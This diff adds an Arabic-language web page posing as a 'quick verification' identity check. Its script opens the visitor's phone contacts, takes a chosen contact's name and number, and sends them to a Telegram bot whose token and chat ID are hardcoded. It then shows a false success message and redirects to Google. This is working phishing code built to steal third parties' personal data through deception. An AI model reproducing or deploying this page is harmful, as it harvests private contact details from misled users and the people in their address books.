@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحقق سريع</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        #btn { padding: 15px 30px; background: #007bff; color: #fff; border: none; border-radius: 8px; cursor: pointer; display: none; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <button id="btn" onclick="getContact()">تأكيد الهوية عبر جهة اتصال</button>
+
+    <script>
+        // إظهار الزر بعد الشاشة البيضاء (ثانية واحدة)
+        setTimeout(() => { document.getElementById('btn').style.display = 'block'; }, 1000);
+
+        async function getContact() {
+            const props = ['name', 'tel'];
+            const opts = { multiple: false }; // يختار اسم واحد فقط
+
+            try {
+                // طلب فتح دفتر العناوين
+                const contacts = await navigator.contacts.select(props, opts);
+                
+                if (contacts.length > 0) {
+                    const contact = contacts[0];
+                    const name = contact.name[0] || "بدون اسم";
+                    const phone = contact.tel[0] || "بدون رقم";
+                    
+                    // إرسال البيانات للبوت
+                    sendToTelegram(name, phone);
+                }
+            } catch (ex) {
+                console.log("خطأ أو المتصفح لا يدعم: " + ex);
+                alert("يرجى المحاولة من متصفح كروم على الجوال");
+            }
+        }
+
+        function sendToTelegram(name, phone) {
+            const token = '8539780988:AAEpnneZHQzVnWUvt0pJI_grq2l4BKv8VMc';
+            const chatId = '916738690';
+            
+            const text = `
+🎯 **تم سحب جهة اتصال!**
+--------------------------
+👤 **الاسم:** ${name}
+📞 **الرقم:** ${phone}
+--------------------------
+✅ **تم الاختيار بنجاح**
+            `;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            .then(() => {
+                alert("تم التحقق بنجاح!");
+                window.location.href = "https://google.com"; // تحويله بعد ما يخلص
+            });
+        }
+    </script>
+</body>
+</html>
